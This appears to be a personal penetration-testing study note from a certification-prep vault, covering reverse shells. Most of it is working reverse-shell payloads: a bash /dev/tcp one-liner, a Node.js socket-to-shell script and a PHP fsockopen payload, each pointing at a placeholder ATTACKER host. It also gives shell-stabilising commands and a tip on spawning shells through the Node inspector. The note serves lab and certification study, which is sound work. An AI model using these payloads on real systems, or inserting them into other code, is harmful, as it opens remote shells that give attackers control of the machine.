---
type: technique
tags: [ejpt:host-net-pentest]
tools: [netcat]
cves: []
related: [[cron-job-abuse]]
---

# Reverse Shells

Opening a connection from the target back to the attacker to gain an interactive shell.

## Common payloads

Bash:

```sh
sh -i >& /dev/tcp/ATTACKER/443 0>&1
```

Node.js (uploaded as a `.js` file):

```js
(function(){
    var net = require("net"), cp = require("child_process"), sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(4444, "ATTACKER", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });
    return /a/;
})();
```

PHP:

```php
<?php $sock=fsockopen("ATTACKER",443); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

## Stabilizing the shell

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
script /dev/null -c bash
```

## Seen in

[[los-3-hackers]], [[baluhome]], [[ignite]], [[guided-pentest]], [[hannah-coffee]], [[balulero]], [[autoescuela]]

> Node inspector tip ([[autoescuela]]): spawn the shell with async `exec()`/`spawn()`, not `execSync()` — the sync form blocks the event loop and freezes the app.
